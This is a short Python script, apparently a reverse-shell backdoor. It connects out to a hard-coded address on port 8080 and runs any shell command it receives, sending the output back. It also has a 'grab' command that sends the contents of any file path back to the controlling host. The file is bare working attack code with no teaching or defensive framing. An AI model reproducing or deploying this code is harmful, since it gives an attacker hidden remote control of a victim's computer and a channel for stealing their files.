import socket
import subprocess
import os

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send("DONE".encode())
    else:
        s.send("file not found".encode())
    

def connect():
    s = socket.socket()
    s.connect(('192.168.42.112',8080))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab,path = command.decode().split("*")
            try:
                transfer(s,path)
            except:
                pass
        elif 'cd' in command.decode():
             code,directory = command.decode().split("*")
             try:
                 os.chdir(directory)
                 s.send(("the current working directory is: " + os.getcwd()).encode())
             except Exception as e:
                 s.send((str(e)).encode())
        else:
            cmd = subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())
def main():
    connect()
main()
